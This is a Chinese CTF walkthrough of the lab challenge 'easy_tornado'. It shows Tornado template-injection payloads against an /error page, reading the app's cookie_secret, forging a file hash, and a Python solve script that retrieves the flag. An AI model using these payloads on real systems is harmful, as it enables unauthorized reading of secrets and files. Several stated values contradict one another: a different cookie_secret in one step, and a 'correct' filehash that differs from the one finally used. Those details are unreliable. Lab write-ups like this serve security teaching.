## [护网杯 2018] easy_tornado Writeup

该 Writeup 完整记录了从信息收集、测试推理、踩坑到最终解题的全过程。



### 一、题目信息

- 题目名称：`[护网杯 2018] easy_tornado`
- 考点：Tornado Web 框架、SSTI（服务端模板注入）、MD5 哈希校验、Cookie Secret 泄露
- 目标：读取服务器上的 flag 文件

---

### 二、初始信息收集

访问靶机首页，看到三个链接：

```
/file?filename=/flag.txt&filehash=f3bcc4ffa39322b3b37592bab93d5285
/file?filename=/welcome.txt&filehash=6cb2dd21c0f422a99ed9d921dc139375
/file?filename=/hints.txt&filehash=219b5eea1efded93f0d62b8e8e70cee5
```

依次点击，查看内容：

| 文件           | 显示内容                           |
| -------------- | ---------------------------------- |
| `/flag.txt`    | `flag in /fllllllllllllag`         |
| `/welcome.txt` | `render`                           |
| `/hints.txt`   | `md5(cookie_secret+md5(filename))` |

**初步结论：**

- 真正的 flag 不在 `/flag.txt`，而在 `/fllllllllllllag`

- 访问任何文件都需要提供 `filehash` 参数，校验公式为：

  ```
  filehash = md5(cookie_secret + md5(filename))
  ```

- `/welcome.txt` 内容为 `render`，暗示 Tornado 的模板渲染功能，可能存在 SSTI

---

### 三、寻找注入点

#### 3.1 直接访问目标文件失败

尝试访问：

```
/file?filename=/fllllllllllllag&filehash=xxx
```

返回：

```
Error
```

说明 `filehash` 校验不通过，无法直接读取。

#### 3.2 测试 `/file` 的 `filename` 参数是否存在注入

尝试：

```
/file?filename={{1+1}}&filehash=xxx
```

同样返回 `Error`，说明请求在 `filehash` 校验阶段就被拒绝了，根本没有进入模板渲染。因此注入点不在 `/file`。

#### 3.3 转向 `/error` 页面

根据 CTF 常见套路，Tornado 应用中错误页面往往存在 SSTI。尝试访问：

```
/error?msg=123
```

页面显示 `123`，说明 `msg` 参数内容会原样返回。

测试 SSTI：

```
/error?msg={{1+1}}
```

返回：

```
500: Internal Server Error
```

`500` 错误说明模板语法被解析了，但执行出错（可能因为 `+` 运算符被限制或导致异常）。

---

### 四、SSTI 过滤规则探测

为了搞清楚哪些字符或语法被过滤，我们进行了一系列测试：

| Payload                        | 返回结果                                  | 分析                             |
| ------------------------------ | ----------------------------------------- | -------------------------------- |
| `/error?msg={{1}}`             | `1`                                       | ✅ 基础变量输出正常               |
| `/error?msg=1`                 | `1`                                       | ✅ 纯文本正常                     |
| `/error?msg={{handler}}`       | `<__main__.ErrorHandler object at 0x...>` | ✅ 可访问对象                     |
| `/error?msg={{ "abc" }}`       | `ORZ`                                     | ❌ 双引号被检测拦截               |
| `/error?msg={ {1} }`           | `{ {1} }`                                 | ❌ 花括号中间有空格时不解析为模板 |
| `/error?msg=%7B%7B1%2B1%7D%7D` | `ORZ`                                     | ❌ URL 解码后仍被检测             |
| `/error?msg={{{{1+1}}}}`       | `500`                                     | ❌ 嵌套花括号语法错误             |
| `/error?msg={{1#2}}3`          | `500`                                     | ❌ `#` 注释符导致解析错误         |
| `/error?msg={%1*2%}`           | `ORZ`                                     | ❌ `{%` 也被拦截                  |

**过滤规则总结：**

- `{{ }}` 模板语法**可用**
- 字符串引号（`"` 或 `'`）会被检测，返回 `ORZ`
- 某些运算符（`+`、`*`）可能导致 `500` 错误
- 但**可以不使用运算符和引号**来读取对象属性

---

### 五、读取 Cookie Secret

在 Tornado 中，配置信息可以通过 `handler.application.settings` 获取。尝试：

```
/error?msg={{handler.application.settings}}
```

返回：

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'e8add7bc-83ac-4912-b69c-527d608bbbbb'} 
```

成功获取到 `cookie_secret`！

```html
cookie_secret = e8add7bc-83ac-4912-b69c-527d608bbbbb'
```

---

### 六、计算正确的 filehash

根据 `hints.txt` 给出的公式：

```
filehash = md5(cookie_secret + md5(filename))
```

目标文件名（来自 `/flag.txt` 的提示）：

```
/fllllllllllllag
```

#### 6.1 第一次计算尝试

我最初在本地计算（使用 12 个 `l`）：

```python
import hashlib
filename = "/fllllllllllllag"   # 这里我数错了 l 的个数
md5_filename = hashlib.md5(filename.encode()).hexdigest()
# 我得到: 3bfdfb0cf5dae7464f17656aab4ed5f1
cookie_secret = "df3e8150-027f-4dbf-be90-1944cb9858b6"
filehash = hashlib.md5((cookie_secret + md5_filename).encode()).hexdigest()
# 我得到: 6b9c2812db8b69b65a318c1f14df04c1
```

#### 6.2 实际运行结果

然而在靶机环境中实际运行 Python 脚本，得到的结果却是：

```
Filename: /fllllllllllllag
Length: 16
md5(filename): 3bf9f6cf685a6dd8defadabfb41a03a1
filehash: b0f240144b9fc48743d790a0f60b110b
```

发现 `md5(filename)` 与我之前算的不同！说明我的文件名中 `l` 的个数数错了。  

题目中的 `/fllllllllllllag` 实际是 **13 个 `l`**（总长度 16 个字符），而不是 12 个（很可能是题目的Bug）。

**教训：** 文件名中的重复字母容易数错，应该直接从页面复制或通过代码验证长度。

#### 6.3 使用正确的 filehash

最终正确的 `filehash` 为：

```
b0f240144b9fc48743d790a0f60b110b
```

---

### 七、获取 Flag

构造最终 URL：

```
http://0ca3749e-3573-4492-81af-c0f792c4f70b.node5.buuoj.cn:81/file?filename=/fllllllllllllag&filehash=79f0a273864473c7ed0cecf8a3d4ddf5
```

访问后，页面显示：

```html
/fllllllllllllag
flag{782ffce5-7911-49e7-b98a-e79862efc389}
```

成功拿到 flag！

---

### 八、完整的解题脚本

```python
import hashlib
import requests

url = "http://0ca3749e-3573-4492-81af-c0f792c4f70b.node5.buuoj.cn:81"

# 通过 SSTI 获取 cookie_secret（手动访问得到）
cookie_secret = "e8add7bc-83ac-4912-b69c-527d608bbbbb"

# 注意：文件名中的 l 个数必须准确，建议直接从题目提示中复制
filename = "/fllllllllllllag"

md5_filename = hashlib.md5(filename.encode()).hexdigest()
print(f"md5({filename}) = {md5_filename}")

filehash = hashlib.md5((cookie_secret + md5_filename).encode()).hexdigest()
print(f"filehash = {filehash}")

resp = requests.get(f"{url}/file?filename={filename}&filehash={filehash}")
print(resp.text)
```

输出：

```python
C:\Users\Administrator\AppData\Local\Programs\Python\Python314\python.exe C:\Users\Administrator\AppData\Roaming\JetBrains\PyCharm2025.3\scratches\scratch_11.py 
md5(/fllllllllllllag) = 3bf9f6cf685a6dd8defadabfb41a03a1
filehash = 79f0a273864473c7ed0cecf8a3d4ddf5
/fllllllllllllag<br>flag{782ffce5-7911-49e7-b98a-e79862efc389}

进程已结束，退出代码为 0
```

---

### 九、踩坑与弯路总结

| 阶段       | 遇到的问题                                     | 解决方法                                                  |
| ---------- | ---------------------------------------------- | --------------------------------------------------------- |
| 寻找注入点 | 误以为 `/file` 的 `filename` 参数存在 SSTI     | 发现 `filehash` 校验在先，转向 `/error` 页面              |
| SSTI 测试  | `{{1+1}}` 返回 `500`，`{{ "abc" }}` 返回 `ORZ` | 逐字符测试，确定引号和运算符被过滤                        |
| 读取配置   | 不知道 Tornado 中如何获取 `cookie_secret`      | 查阅文档，使用 `handler.application.settings`             |
| 文件名长度 | 数错 `/fllllllllllllag` 中 `l` 的个数          | 用代码输出长度验证，或直接从源码复制（很可能是题目的Bug） |
| MD5 计算   | 本地计算与服务器结果不一致                     | 在靶机环境运行 Python 确认实际值                          |

---

### 十、知识点总结

| 知识点                         | 说明                                              |
| ------------------------------ | ------------------------------------------------- |
| Tornado 框架                   | Python Web 框架，存在 SSTI 漏洞                   |
| SSTI 注入点                    | `/error?msg=` 参数未过滤模板语法                  |
| 过滤绕过                       | 避免使用引号和运算符，直接访问对象属性            |
| `handler.application.settings` | Tornado 中获取配置信息（含 `cookie_secret`）      |
| MD5 哈希校验                   | `filehash = md5(cookie_secret + md5(filename))`   |
| 文件名准确性                   | 重复字母容易数错，必须严格复制（应该是题目的Bug） |

---

### 十一、最终 Flag

```html
flag{782ffce5-7911-49e7-b98a-e79862efc389}
```

---

本题综合考察了 SSTI 注入、框架配置读取、哈希校验绕过等技能，是一道典型的 Tornado 题。

